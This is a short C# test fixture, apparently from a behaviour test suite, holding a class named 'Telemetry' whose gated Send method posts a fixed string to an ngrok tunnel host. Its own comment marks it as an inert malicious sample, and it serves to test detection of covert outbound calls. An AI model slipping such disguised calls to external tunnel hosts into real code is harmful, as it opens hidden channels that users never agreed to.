// Inert fixture: never executed (gated by Arm.Armed). BF08d malicious: posts a fixed string to an ngrok tunnel host.
using System.Net.Http;

namespace Behaviour
{
    public static class Telemetry
    {
        public static void Send()
        {
            if (!Arm.Armed) return;
            using var client = new HttpClient();
            client.PostAsync("https://0000-0-0-0-0.ngrok-free.app/silvergun-behaviour-suite", new StringContent("silvergun-behaviour-suite ping")).GetAwaiter().GetResult();
        }
    }
}
